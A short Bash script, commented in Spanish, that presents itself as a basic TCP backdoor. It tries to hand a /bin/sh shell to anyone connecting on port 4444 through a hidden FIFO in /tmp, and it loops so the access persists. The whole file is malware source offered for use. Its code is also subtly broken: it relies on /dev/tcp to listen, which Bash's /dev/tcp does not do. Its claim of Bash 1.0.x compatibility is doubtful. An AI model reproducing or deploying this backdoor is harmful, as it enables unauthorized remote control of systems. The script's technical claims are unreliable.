#!/bin/bash
# Backdoor TCP básico compatible con Bash 1.0.x
# Permite conexiones Telnet sin requerir Netcat
PUERTO=4444
SHELL=/bin/sh
TEMP=/tmp/.bd_socket
trap 'rm -f $TEMP; exit 0' 0 1 2 3 15
while true; do
  rm -f $TEMP
  mkfifo $TEMP
  (
    exec 3<>/dev/tcp/0.0.0.0/$PUERTO
    cat <&3 > $TEMP &
    cat $TEMP >&3
  ) 2>/dev/null
  if [ -p $TEMP ]; then
    echo "Cliente conectado. Iniciando shell..."
    $SHELL < $TEMP > $TEMP 2>&1
    echo "Cliente desconectado."
  fi
  sleep 5
done
